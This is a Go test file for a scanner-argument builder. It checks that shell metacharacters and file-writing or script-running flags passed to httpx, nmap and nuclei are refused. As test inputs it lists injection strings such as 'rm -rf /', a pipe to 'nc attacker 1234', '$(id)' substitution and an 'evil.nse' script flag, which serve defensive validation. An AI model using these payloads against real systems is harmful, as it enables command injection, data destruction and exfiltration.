// Copyright 2026 Hanzo AI Inc. All Rights Reserved.

package scan

import (
	"strings"
	"testing"
)

// httpxLike is the descriptor one of the providers carries, used here so the
// rules are exercised through the same shape production uses.
var httpxLike = scanner{
	name: "httpx", bin: "/usr/bin/httpx",
	defaultArgs: "-u %s -json",
	jsonFlags:   []string{"-json", "-jsonl"}, addJSON: "-json",
	targetFlags: []string{"-u", "-target", "-l"}, addTarget: "-u",
	offLimits: []string{"-config", "-rl-file"},
}

// The real four, so what this file asserts is what those tools are handed.
var nmapLike = scanner{
	name: "nmap", bin: "/usr/bin/nmap", defaultArgs: "-sn %s",
	offLimits: []string{"-script", "-script-args-file", "-datadir", "-resume"},
}

var nucleiLike = scanner{
	name: "nuclei", bin: "/usr/bin/nuclei", defaultArgs: "-u %s -jsonl",
	jsonFlags: []string{"-jsonl", "-json"}, addJSON: "-jsonl",
	targetFlags: []string{"-u", "-target", "-l"}, addTarget: "-u",
	offLimits: []string{"-t", "-templates", "-w", "-workflows", "-tp", "-template-path", "-config"},
}

// A scan target reaches this from a request and is handed to a process, so what
// it may contain is the whole of the question.
//
// This was the one part identical in all three providers and the one part none
// of them asserted: sixty lines duplicated three ways, and no test that a
// semicolon in a target is refused. A relaxed copy would have looked exactly
// like the other two.
func TestAShellMetacharacterNeverReachesTheProcess(t *testing.T) {
	for _, bad := range []string{
		"example.com; rm -rf /",
		"example.com && whoami",
		"example.com | nc attacker 1234",
		"example.com `id`",
		"example.com $HOME",
		"$(id).example.com",
	} {
		t.Run(bad, func(t *testing.T) {
			if _, err := httpxLike.argv(bad, ""); err == nil {
				t.Errorf("target %q was accepted", bad)
			}
		})
	}

	if _, err := httpxLike.argv("", ""); err == nil {
		t.Error("an empty target was accepted")
	}
}

// The command is written by an operator rather than carried on a request, so it
// is allowed a dollar and refused the metacharacters that chain a second
// process. That asymmetry is deliberate and easy to erase by tidying, so it is
// stated here.
func TestACommandMayHoldADollarAndNeverASemicolon(t *testing.T) {
	for _, bad := range []string{"-u %s; id", "-u %s && id", "-u %s | id", "-u %s `id`"} {
		if _, err := httpxLike.argv("example.com", bad); err == nil {
			t.Errorf("command %q was accepted", bad)
		}
	}
	if _, err := httpxLike.argv("example.com", "-u %s -json -H $TOKEN"); err != nil {
		t.Errorf("a command referencing a variable was refused: %v", err)
	}
}

// Where the target lands, and that structured output is always asked for.
func TestTheTargetGoesWhereTheCommandSaysAndTheOutputIsAlwaysStructured(t *testing.T) {
	for _, tc := range []struct {
		what, command string
		want          []string
	}{
		{"the default names it through %s", "", []string{"-u", "example.com", "-json"}},
		{"an explicit %s is where it goes", "-u %s -json", []string{"-u", "example.com", "-json"}},
		{"no %s and no target flag appends it", "-json", []string{"-json", "-u", "example.com"}},
		{"a command that already names the target keeps its own", "-l hosts.txt -json", []string{"-l", "hosts.txt", "-json"}},
		{"structured output is added when unasked", "-u %s", []string{"-u", "example.com", "-json"}},
		{"and not added twice when asked", "-u %s -jsonl", []string{"-u", "example.com", "-jsonl"}},
	} {
		t.Run(tc.what, func(t *testing.T) {
			got, err := httpxLike.argv("example.com", tc.command)
			if err != nil {
				t.Fatalf("argv: %v", err)
			}
			if strings.Join(got, " ") != strings.Join(tc.want, " ") {
				t.Errorf("argv = %v, want %v", got, tc.want)
			}
		})
	}
}

// Each provider keeps its own flags, and the rules are the same for all of them.
func TestEveryScannerRefusesTheSameThings(t *testing.T) {
	for _, s := range []scanner{
		httpxLike,
		{name: "nuclei", defaultArgs: "-u %s -jsonl", jsonFlags: []string{"-jsonl", "-json"}, addJSON: "-jsonl",
			targetFlags: []string{"-u", "-target", "-l"}, addTarget: "-u"},
		{name: "subfinder", defaultArgs: "-d %s -json", jsonFlags: []string{"-json", "-oJ"}, addJSON: "-json",
			targetFlags: []string{"-d", "-domain", "-dL"}, addTarget: "-d"},
	} {
		t.Run(s.name, func(t *testing.T) {
			if _, err := s.argv("example.com; id", ""); err == nil {
				t.Error("a target carrying a semicolon was accepted")
			}
			args, err := s.argv("example.com", "")
			if err != nil {
				t.Fatalf("argv: %v", err)
			}
			if !contains(args, "example.com") {
				t.Errorf("argv = %v, want the target in it", args)
			}
		})
	}
}

// A scan command reaches a security tool as its arguments, and those tools can
// write files and run scripts. Whoever may file a scan is an org's own admin —
// so without this, being an admin of your own organization is being able to write
// a file and execute a script on the machine the scan runs on.
func TestAScanCannotWriteAFileOrRunAScript(t *testing.T) {
	// Writing to the disk is refused for every one of them: results are read from
	// STDOUT, so a flag that sends output to a file breaks the feature it is in.
	for _, s := range []scanner{httpxLike, nmapLike, nucleiLike} {
		for _, command := range []string{
			"-oN /tmp/x %s", "-oA /tmp/x %s", "-oX/tmp/x %s", "-oN=/tmp/x %s",
			"--output /tmp/x %s", "-o /tmp/x %s", "-u %s -srd /tmp/out",
			"-u %s --store-response-dir /tmp/out", "-u %s -or /tmp/x",
			"--stylesheet /tmp/x %s",
		} {
			if _, err := s.argv("example.com", command); err == nil {
				t.Errorf("%s allowed %q", s.name, command)
			}
		}
	}

	// Running something off the disk is refused per tool, because the flag that
	// does it is the tool's own.
	for _, c := range []struct {
		s       scanner
		command string
	}{
		{nmapLike, "--script /tmp/evil.nse %s"},
		{nmapLike, "--script=http-vuln %s"},
		{nmapLike, "-script /tmp/x %s"},
		{nmapLike, "--datadir /tmp/x %s"},
		{nmapLike, "--script-args-file /tmp/x %s"},
		{nucleiLike, "-u %s -t /tmp/templates"},
		{nucleiLike, "-u %s -w /tmp/wf.yaml"},
		{nucleiLike, "-u %s --template-path /tmp/t"},
		{httpxLike, "-u %s -config /tmp/c.yaml"},
	} {
		if _, err := c.s.argv("example.com", c.command); err == nil {
			t.Errorf("%s allowed %q", c.s.name, c.command)
		}
	}

	// The same short flag is not the same thing twice: -t names nuclei's
	// templates, which execute, and httpx's thread count, which does not.
	if _, err := httpxLike.argv("example.com", "-u %s -t 40"); err != nil {
		t.Errorf("httpx was refused a thread count: %v", err)
	}

	// And what a scan is actually made of still goes through.
	for _, c := range []struct {
		s       scanner
		command string
	}{
		{httpxLike, ""},
		{httpxLike, "-u %s -json"},
		{httpxLike, "-u %s -silent -status-code"},
		{httpxLike, "-l hosts.txt -json"},
		{nmapLike, "-sn %s"},
		{nmapLike, "-sV -p 80,443 %s"},
		{nmapLike, "-T4 --top-ports 100 %s"},
		{nucleiLike, "-u %s -jsonl -severity high"},
	} {
		if _, err := c.s.argv("example.com", c.command); err != nil {
			t.Errorf("%s refused %q: %v", c.s.name, c.command, err)
		}
	}
}
